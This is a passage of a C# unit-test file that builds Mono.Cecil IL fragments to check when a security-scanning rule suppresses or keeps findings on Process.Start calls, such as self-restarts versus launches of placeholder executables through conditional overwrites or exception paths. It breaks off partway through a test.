    public void ShouldSuppressFinding_ProcessStartInfoConstructorRestart_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        constructor.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(startInfoType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ConditionalRestartOverrideOfOtherTarget_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        method.Parameters.Add(new ParameterDefinition(
            new TypeReference("System", "Boolean", null, null)));
        var startInfoLocal = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfoLocal);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        constructor.Parameters.Add(new ParameterDefinition(stringType));
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var processStart = CreateProcessStart(startInfoType);
        var launch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "other.exe");
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, startInfoLocal);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brfalse_S, launch);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_GetterBackedProcessStartInfoRestart_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var processLocal = new VariableDefinition(processType);
        method.Body.Variables.Add(processLocal);
        var processConstructor = new MethodReference(".ctor", method.ReturnType, processType) { HasThis = true };
        var getStartInfo = new MethodReference("get_StartInfo", startInfoType, processType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var processStart = new MethodReference("Start", new TypeReference("System", "Boolean", null, null),
            processType)
        { HasThis = true };
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, processConstructor);
        il.Emit(OpCodes.Stloc, processLocal);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Callvirt, getStartInfo);
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Callvirt, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_GetterBackedRestartWithSecondProperty_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var processLocal = new VariableDefinition(processType);
        method.Body.Variables.Add(processLocal);
        var processConstructor = new MethodReference(".ctor", method.ReturnType, processType) { HasThis = true };
        var getStartInfo = new MethodReference("get_StartInfo", startInfoType, processType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var setUseShellExecute = new MethodReference("set_UseShellExecute", method.ReturnType, startInfoType)
        { HasThis = true };
        setUseShellExecute.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var processStart = new MethodReference("Start", new TypeReference("System", "Boolean", null, null),
            processType)
        { HasThis = true };
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, processConstructor);
        il.Emit(OpCodes.Stloc, processLocal);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Callvirt, getStartInfo);
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Callvirt, getStartInfo);
        il.Emit(OpCodes.Ldc_I4_1);
        il.Emit(OpCodes.Callvirt, setUseShellExecute);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Callvirt, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_SavedRestartAcrossUnrelatedBranch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var processStart = CreateProcessStart(stringType);
        var branchTarget = Instruction.Create(OpCodes.Ldloc, targetLocal);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Emit(OpCodes.Ldc_I4_0);
        il.Emit(OpCodes.Brfalse_S, branchTarget);
        il.Emit(OpCodes.Nop);
        il.Append(branchTarget);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_SavedRestartWithConditionalOverwrite_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var processStart = CreateProcessStart(stringType);
        var branchTarget = Instruction.Create(OpCodes.Ldloc, targetLocal);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Emit(OpCodes.Ldc_I4_0);
        il.Emit(OpCodes.Brfalse_S, branchTarget);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Append(branchTarget);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_RestartSetterBypassedByException_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var startInfoLocal = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfoLocal);

        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        constructor.Parameters.Add(new ParameterDefinition(stringType));
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var mayThrow = new MethodReference("MayThrow", method.ReturnType,
            new TypeReference("Test", "Helpers", null, null));
        var processStart = new MethodReference("Start", processType, processType);
        processStart.Parameters.Add(new ParameterDefinition(startInfoType));

        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, startInfoLocal);
        var tryStart = Instruction.Create(OpCodes.Call, mayThrow);
        il.Append(tryStart);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Callvirt, setFileName);
        var afterHandler = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Leave, afterHandler);
        var handlerStart = Instruction.Create(OpCodes.Pop);
        il.Append(handlerStart);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(afterHandler);
        il.Emit(OpCodes.Call, processStart);

        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler,
            CatchType = new TypeReference("System", "Exception", null, null)
        });
        var signals = new MethodSignals
        {
            ExceptionHandlers = method.Body.ExceptionHandlers.ToArray()
        };

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, signals);

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_StringRestartStoreBypassedByException_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Stloc, targetLocal);
        var tryStart = Instruction.Create(OpCodes.Call,
            new MethodReference("MayThrow", method.ReturnType, new TypeReference("Test", "Helpers", null, null)));
        il.Append(tryStart);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, targetLocal);
        var launch = Instruction.Create(OpCodes.Ldloc, targetLocal);
        il.Emit(OpCodes.Leave, launch);
        var handlerStart = Instruction.Create(OpCodes.Pop);
        il.Append(handlerStart);
        il.Emit(OpCodes.Leave, launch);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = launch,
            CatchType = new TypeReference("System", "Exception", null, null)
        });
        var signals = new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() };

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, signals);

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_SafeFileNameWithConditionalLaterOverwrite_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var startInfoLocal = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfoLocal);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = new MethodReference("Start", processType, processType);
        processStart.Parameters.Add(new ParameterDefinition(startInfoType));
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, startInfoLocal);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldarg_0);
        var launch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Brfalse, launch);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ConditionalSafeStartInfoAssignment_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var processLocal = new VariableDefinition(processType);
        var maliciousStartInfo = new VariableDefinition(startInfoType);
        var safeStartInfo = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(processLocal);
        method.Body.Variables.Add(maliciousStartInfo);
        method.Body.Variables.Add(safeStartInfo);
        var processConstructor = new MethodReference(".ctor", method.ReturnType, processType) { HasThis = true };
        var startInfoConstructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        startInfoConstructor.Parameters.Add(new ParameterDefinition(stringType));
        var setStartInfo = new MethodReference("set_StartInfo", method.ReturnType, processType) { HasThis = true };
        setStartInfo.Parameters.Add(new ParameterDefinition(startInfoType));
        var processStart = new MethodReference("Start", new TypeReference("System", "Boolean", null, null),
            processType)
        { HasThis = true };
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, processConstructor);
        il.Emit(OpCodes.Stloc, processLocal);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Newobj, startInfoConstructor);
        il.Emit(OpCodes.Stloc, maliciousStartInfo);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Newobj, startInfoConstructor);
        il.Emit(OpCodes.Stloc, safeStartInfo);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Ldloc, maliciousStartInfo);
        il.Emit(OpCodes.Callvirt, setStartInfo);
        il.Emit(OpCodes.Ldarg_0);
        var launch = Instruction.Create(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Brfalse, launch);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Ldloc, safeStartInfo);
        il.Emit(OpCodes.Callvirt, setStartInfo);
        il.Append(launch);
        il.Emit(OpCodes.Callvirt, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ReassignedStartInfoParameter_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var startInfoParameter = new ParameterDefinition(startInfoType);
        method.Parameters.Add(startInfoParameter);
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        constructor.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = new MethodReference("Start", processType, processType);
        processStart.Parameters.Add(new ParameterDefinition(startInfoType));
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldarg, startInfoParameter);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Starg, startInfoParameter);
        il.Emit(OpCodes.Ldarg, startInfoParameter);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ConditionalExplorerLocalOverwrite_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var stringType = new TypeReference("System", "String", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Emit(OpCodes.Ldarg_0);
        var launch = Instruction.Create(OpCodes.Ldloc, targetLocal);
        il.Emit(OpCodes.Brfalse, launch);
        il.Emit(OpCodes.Ldstr, "explorer.exe");
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ConstructorRestartWithConditionalLaterOverwrite_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var startInfoLocal = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfoLocal);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        constructor.Parameters.Add(new ParameterDefinition(stringType));
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = new MethodReference("Start", processType, processType);
        processStart.Parameters.Add(new ParameterDefinition(startInfoType));
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, startInfoLocal);
        il.Emit(OpCodes.Ldarg_0);
        var launch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Brfalse, launch);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CurrentProcessReceiverBypassedByException_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var processLocal = new VariableDefinition(processType);
        method.Body.Variables.Add(processLocal);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, new MethodReference(".ctor", method.ReturnType, processType) { HasThis = true });
        il.Emit(OpCodes.Stloc, processLocal);
        var tryStart = Instruction.Create(OpCodes.Call,
            new MethodReference("MayThrow", method.ReturnType, new TypeReference("Test", "Helpers", null, null)));
        il.Append(tryStart);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Stloc, processLocal);
        var launch = Instruction.Create(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Leave, launch);
        var handlerStart = Instruction.Create(OpCodes.Pop);
        il.Append(handlerStart);
        il.Emit(OpCodes.Leave, launch);
        il.Append(launch);
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Call, processStart);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = launch,
            CatchType = new TypeReference("System", "Exception", null, null)
        });
        var signals = new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() };

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, signals);

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_SavedRestartBeforeUnrelatedFileNameLookup_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stringType = new TypeReference("System", "String", null, null);
        var targetLocal = new VariableDefinition(stringType);
        method.Body.Variables.Add(targetLocal);
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var processConstructor = new MethodReference(".ctor", method.ReturnType, processType) { HasThis = true };
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Stloc, targetLocal);
        il.Emit(OpCodes.Newobj, processConstructor);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Pop);
        il.Emit(OpCodes.Ldloc, targetLocal);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ShellFolderLaunch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
        var processor = method.Body.GetILProcessor();
        var processStartInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var startInfoLocal = new VariableDefinition(processStartInfoType);
        method.Body.Variables.Add(startInfoLocal);

        var createDirectory = new MethodReference("CreateDirectory", new TypeReference("", "DirectoryInfo", null, null),
            new TypeReference("System.IO", "Directory", null, null));
        createDirectory.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));

        var constructor = new MethodReference(".ctor", new TypeReference("", "Void", null, null), processStartInfoType)
        {
            HasThis = true
        };
        var setFileName = new MethodReference("set_FileName", new TypeReference("", "Void", null, null), processStartInfoType)
        {
            HasThis = true
        };
        setFileName.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
        var setUseShellExecute = new MethodReference("set_UseShellExecute", new TypeReference("", "Void", null, null), processStartInfoType)
        {
            HasThis = true
        };
        setUseShellExecute.Parameters.Add(new ParameterDefinition(new TypeReference("", "Boolean", null, null)));
        var processStart = new MethodReference("Start", new TypeReference("", "Process", null, null),
            new TypeReference("System.Diagnostics", "Process", null, null));
        processStart.Parameters.Add(new ParameterDefinition(processStartInfoType));

        processor.Emit(OpCodes.Ldarg_0);
        processor.Emit(OpCodes.Call, createDirectory);
        processor.Emit(OpCodes.Pop);

        processor.Emit(OpCodes.Newobj, constructor);
        processor.Emit(OpCodes.Stloc, startInfoLocal);
